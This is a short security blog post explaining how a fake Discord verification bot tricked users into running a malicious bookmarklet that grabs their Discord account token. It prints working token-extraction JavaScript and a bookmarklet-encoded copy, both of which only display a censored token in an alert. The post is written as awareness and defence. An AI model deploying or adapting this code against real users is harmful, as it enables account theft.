<!doctype html><html><head><meta charset=UTF-8><meta content="IE=edge"http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0"name=viewport><title> How bookmarks can steal your Discord Token </title><link href=https://y3ll0wlife.github.io/fonts.css rel=stylesheet><link href=https://y3ll0wlife.github.io/atom.xml rel=alternate title=y3ll0w type=application/atom+xml><link href=https://y3ll0wlife.github.io/theme/dark.css rel=stylesheet><link href=https://y3ll0wlife.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://y3ll0wlife.github.io>y3ll0w</a></div><nav><a style="margin-left: 0.7em"href=/posts>/posts</a></nav></header><main><article><div class=title><div class=page-header>How bookmarks can steal your Discord Token<span style="font-size: 1.6em"class=primary-color>.</span></div><div class=meta>Posted on 2022-05-23</div></div><section class=body><h2 id=what-are-bookmarklets>What are <a href=https://en.wikipedia.org/wiki/Bookmarklet>Bookmarklets</a></h2><blockquote><p>A bookmarklet is a bookmark stored in a web browser that contains JavaScript commands that add new features to the browser. They are stored as the URL of a bookmark in a web browser or as a hyperlink on a web page. Bookmarklets are usually small snippets of JavaScript executed when user clicks on them. When clicked, bookmarklets can perform a wide variety of operations, such as running a search query from selected text or extracting data from a table.</blockquote><p>Bookmarklets are a fantastic way for developers to do simple tasks on websites with the help of the javascript on the website but can also be used for nefarious reasons as shown in this article. Bookmarklets can execute any form of javascript code given to it and also bypass <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP>Content Security Policy (CSP)</a> which is used to protect you on the web.<h2 id=what-can-happen-on-discord>What can happen on Discord?</h2><p>This attack vector makes it possible for users to execute arbitrary javascript code on any site, including Discord which can expose your user token (the unique code to your Discord account).<p>On a post made on Reddit <a href=https://www.reddit.com/r/discordapp/comments/uv7w5j/brilliant_method_get_compromised_without_giving/>Brilliant Method, Get compromised without giving credentials by dragging in bookmark | Dyno Premium Custom Embed misused to verify on a fake dyno domain</a> by <a href=https://www.reddit.com/user/Meister-9667/>u/Meister-9667</a>, we can see that a faked version of the popular Discord bot Dyno is used to trick users into adding the bookmarklet to their bookmarks and pressing it as a way to identify themselves on the server. <img src=https://cdn.discordapp.com/attachments/928757369767354369/978387128193019954/ezgif.com-gif-maker.gif><p>What happens here is that the user is unknowingly giving the attacker their user token.<h2 id=how-does-this-work>How does this work?</h2><p>Here below you can see a simple version of a token grabber that makes a popup on the screen with the two last parts of the token censored.<pre class=language-js data-lang=js style=background-color:#0f1419;color:#bfbab0;><code class=language-js data-lang=js><span style=color:#ff7733;>let </span><span>token</span><span style=color:#bfbab0cc;>;
</span><span>
</span><span>webpackChunkdiscord_app</span><span style=color:#f29668;>.</span><span style=color:#f07178;>push</span><span>([
</span><span>    [</span><span style=font-style:italic;color:#f29668;>Math</span><span style=color:#f29668;>.</span><span style=color:#f07178;>random</span><span>()]</span><span style=color:#bfbab0cc;>,
</span><span>    {}</span><span style=color:#bfbab0cc;>,
</span><span>    </span><span style=color:#f29718;>r </span><span style=color:#ff7733;>=> </span><span>{
</span><span>       token </span><span style=color:#f29668;>= </span><span style=font-style:italic;color:#39bae6;>Object</span><span style=color:#f29668;>.</span><span style=color:#f07178;>values</span><span>(r</span><span style=color:#f29668;>.</span><span>c)
</span><span>            </span><span style=color:#f29668;>.</span><span style=color:#f07178;>find</span><span>(</span><span style=color:#f29718;>m </span><span style=color:#ff7733;>=> </span><span>m</span><span style=color:#f29668;>.</span><span>exports </span><span style=color:#f29668;>&& </span><span>m</span><span style=color:#f29668;>.</span><span>exports</span><span style=color:#f29668;>.</span><span>default </span><span style=color:#f29668;>&& </span><span>m</span><span style=color:#f29668;>.</span><span>exports</span><span style=color:#f29668;>.</span><span>default</span><span style=color:#f29668;>.</span><span>getToken </span><span style=color:#f29668;>!== void </span><span style=color:#f29718;>0</span><span>)
</span><span>            </span><span style=color:#f29668;>.</span><span>exports</span><span style=color:#f29668;>.</span><span>default</span><span style=color:#f29668;>.</span><span style=color:#ffb454;>getToken</span><span>()</span><span style=color:#bfbab0cc;>;
</span><span>    }</span><span style=color:#bfbab0cc;>,
</span><span>])</span><span style=color:#bfbab0cc;>;
</span><span>
</span><span style=color:#ffb454;>alert</span><span>(</span><span style=color:#c2d94c;>`${</span><span>token</span><span style=color:#f29668;>.</span><span style=color:#f07178;>split</span><span style=color:#c2d94c;>(".")[</span><span style=color:#f29718;>0</span><span style=color:#c2d94c;>]}.██.███████`</span><span>)</span><span style=color:#bfbab0cc;>; </span><span style=font-style:italic;color:#5c6773;>// parts of the token is censored
</span></code></pre><p>But we can convert the following code to a bookmarklet to test it out. Here below is the above code in a bookmarklet-friendly syntax. Now we can add this to our browser and press it on the Discord website and boom you lost access to your account.<pre class=language-js data-lang=js style=background-color:#0f1419;color:#bfbab0;><code class=language-js data-lang=js><span style=color:#59c2ff;>javascript</span><span style=color:#bfbab0cc;>:</span><span>(</span><span style=color:#ff7733;>function</span><span>()%7</span><span style=color:#ffb454;>Blet</span><span>%20</span><span style=color:#ffb454;>token</span><span>%3</span><span style=color:#ffb454;>BwebpackChunkdiscord_app</span><span>.</span><span style=color:#ffb454;>push</span><span>(%5B%5BMath.random()%5</span><span style=color:#ffb454;>D</span><span>%2</span><span style=color:#ffb454;>C</span><span>%7</span><span style=color:#ffb454;>B</span><span>%7</span><span style=color:#ffb454;>D</span><span>%2</span><span style=color:#ffb454;>Cr</span><span>%20%3</span><span style=color:#ffb454;>D</span><span>%3</span><span style=color:#ffb454;>E</span><span>%20%7</span><span style=color:#ffb454;>Btoken</span><span>%20%3</span><span style=color:#ffb454;>D</span><span>%20</span><span style=color:#ffb454;>Object</span><span>.</span><span style=color:#ffb454;>values</span><span>(r.c).</span><span style=color:#ffb454;>find</span><span>(</span><span style=color:#f29718;>m</span><span>%20%3D%3E%20m.exports%20%26%26%20m.exports.default%20%26%26%20m.exports.default.getToken%20!%3D%3D%20void%200).</span><span style=color:#ffb454;>exports</span><span>.</span><span style=color:#ffb454;>default</span><span>.</span><span style=color:#ffb454;>getToken</span><span>()%3</span><span style=color:#ffb454;>B</span><span>%7</span><span style=color:#ffb454;>D</span><span>%2</span><span style=color:#ffb454;>C</span><span>%5</span><span style=color:#ffb454;>D</span><span>)%3</span><span style=color:#ffb454;>Balert</span><span>(%60%24%7Btoken.split(%22.%22)%5</span><span style=color:#ffb454;>B0</span><span>%5</span><span style=color:#ffb454;>D</span><span>%7</span><span style=color:#ffb454;>D</span><span>.%</span><span style=color:#ffb454;>E2</span><span>%96%88%</span><span style=color:#ffb454;>E2</span><span>%96%88.%</span><span style=color:#ffb454;>E2</span><span>%96%88%</span><span style=color:#ffb454;>E2</span><span>%96%88%</span><span style=color:#ffb454;>E2</span><span>%96%88%</span><span style=color:#ffb454;>E2</span><span>%96%88%</span><span style=color:#ffb454;>E2</span><span>%96%88%</span><span style=color:#ffb454;>E2</span><span>%96%88%</span><span style=color:#ffb454;>E2</span><span>%96%88%60)%7</span><span style=color:#ffb454;>D</span><span>)()
</span></code></pre><p><img src=https://cdn.discordapp.com/attachments/928757369767354369/977938749923156068/iCbGIkjVAl3cjXD.gif><h2 id=so-what-can-be-done>So what can be done?</h2><p>Simple, don't put bookmarks you don't trust. If a bot offers this as a way of verification you should imminently be suspicious and conclude that it's most likely a way to scam you.</section></article></main></div>